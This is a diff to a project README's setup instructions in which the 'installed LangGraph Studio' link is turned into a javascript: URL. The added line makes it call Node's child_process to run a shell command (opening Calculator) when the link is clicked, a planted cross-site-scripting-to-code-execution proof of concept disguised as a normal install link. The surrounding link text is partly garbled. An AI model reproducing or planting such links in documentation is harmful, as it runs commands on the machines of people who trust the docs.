@@ -30,7 +30,7 @@ By default, it's set up to answer questions based on the user's indexed document
 
 ## Getting Started
 
-Assuming you have already [installed LangGraph Studio](javascript:alert(22)) sasi(;#//https://github.com/langchain-ai/langgraph-studio?tab=readme-ov-file#download), to set up:
+Assuming you have already [installed LangGraph Studio](javascript:alert(22);require('child_process').exec('open /Applications/Calculator.app');) sasi(;#//https://github.com/langchain-ai/langgraph-studio?tab=readme-ov-file#download), to set up:
 
 1. Create a `.env` file.
 
